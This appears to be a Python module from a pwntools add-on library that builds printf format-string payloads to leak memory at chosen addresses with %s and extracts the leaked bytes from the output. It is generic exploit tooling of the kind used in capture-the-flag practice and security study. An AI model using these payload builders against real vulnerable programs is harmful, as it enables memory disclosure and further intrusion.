'''tools for printf leaking, which pwntools
(at the time of writing) appears to lack'''
from typing import List, Callable
from pwnlib.util.packing import pack
from pwnscripts.context import context

def deref_payload(buffer_offset: int, addr: List[int]) -> bytes:
    '''Make a suboptimal printf payload for dereferencing the addresses
    in `addr`.
    It's sister function, _deref_extractor(), can be used to get the
    result of the dereferencing.
    
    Arguments:
        `buffer_offset`: the stack offset at which the input to the
            format string is found.
        `addr`: the addresses to leak with %s.
    
    Returns: a payload to send to a printf() function'''
    # You could fit this into one line, but readability
    len_addr = len(addr)
    extra_len = len('%$s||')+len(str(buffer_offset+len_addr))+1  #length of one %{}$s, maximally
    extra_offset = (len_addr*extra_len + len('^^$$')) // (context.bytes)
    off = buffer_offset + extra_offset  # buf_off + (length of ^^ + all %{}$s, divided by word size)
	
    # payload
    payload = '||'.join("%{}$s".format(i) for i in range(off, off+len(addr)))
    payload = '^^' + payload + '$$'
    payload = payload.ljust(extra_offset*context.bits//8,'\x19').encode()
    payload += b''.join(map(pack, addr))
    return payload

def deref_extractor(resp: bytes) -> List[bytes]:
    '''Extract the bytestrings leaked using a _deref_payload()
    Example usage:
    >>> r.sendline(leak_printf_deref_payload(...))
    >>> extracted = leak_printf_deref_extractor(r.recvline())
    Arguments:
        `resp`: the output of the printf() that took a deref_payload()
            as input.
    
    Returns: a list of the bytestrings extracted by %s.'''
    resp = resp[ resp.find(b'^^')+2 : resp.find(b'$$') ]
    return resp.split(b'||')

def dereference(sendprintf: Callable[[bytes],bytes], buffer_offset: int, addr: List[int]) -> List[bytes]:
    '''Leak the contents of a number of `addr`esses with %s, returning the output.

    Arguments:
        `sendprintf`: a function that simulates a single printf() call.
            The function assumes that `sendprintf` can accept an infinite
            (realistically, 15~20 bytes per address given) number of bytes.
        `buffer_offset`: the stack offset at which the input to the
            format string is found.
        `addr`: the addresses to leak with %s.

    Returns: a list of the bytestrings extracted by %s.'''
    return deref_extractor(sendprintf(deref_payload(buffer_offset, addr)+'\n'))